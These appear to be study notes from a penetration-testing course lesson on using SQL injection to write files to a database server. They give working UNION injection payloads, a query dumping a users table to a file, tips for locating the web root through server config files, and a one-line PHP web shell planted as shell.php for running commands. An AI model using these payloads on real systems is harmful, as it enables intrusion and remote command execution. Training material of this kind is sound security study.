
## SELECT INTO OUTFILE

Now that we have confirmed that our user should write files to the back-end server, let's try to do that using the `SELECT .. INTO OUTFILE` statement. The [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) statement can be used to write data from select queries into files. This is usually used for exporting data from tables.

To use it, we can add `INTO OUTFILE '...'` after our query to export the results into the file we specified. The below example saves the output of the `users` table into the `/tmp/credentials` file:

``` sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

It is also possible to directly `SELECT` strings into files, allowing us to write arbitrary files to the back-end server.
```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```
>Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.

## Writing Files through SQL Injection

Let's try writing a text file to the webroot and verify if we have write permissions. The below query should write `file written successfully!` to the `/var/www/html/proof.txt` file, which we can then access on the web application:

```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

>**Note:** To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

The `UNION` injection payload would be as follows:
```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

## Writing a Web Shell

Having confirmed write permissions, we can go ahead and write a PHP web shell to the webroot folder. We can write the following PHP webshell to be able to execute commands directly on the back-end server:
```php
<?php system($_REQUEST[0]); ?>
```
We can reuse our previous `UNION` injection payload, and change the string to the above, and the file name to `shell.php`:
```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
Once again, we don't see any errors, which means the file write probably worked. This can be verified by browsing to the `/shell.php` file and executing commands via the `0` parameter, with `?0=id` in our URL:
![[2023-05-04 17_59_52-Hack The Box - Academy.png|600]]

___
